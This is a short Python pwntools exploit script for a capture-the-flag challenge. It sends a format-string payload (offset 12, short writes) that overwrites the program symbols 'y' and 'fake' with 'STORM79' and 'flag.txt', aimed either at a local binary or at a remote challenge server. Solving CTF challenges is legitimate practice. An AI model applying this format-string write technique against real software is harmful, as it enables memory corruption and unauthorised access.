#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("178.128.29.224", 9478)

    return r


def main():
    r = conn()
    offset = 12
    payload = fmtstr_payload(offset,{exe.sym['y']:"STORM79",exe.sym['fake']:"flag.txt"},write_size='short')
    r.sendline(payload)
    r.sendline("wualawewa")


    # good luck pwning :)

    print(r.recvall())


if __name__ == "__main__":
    main()
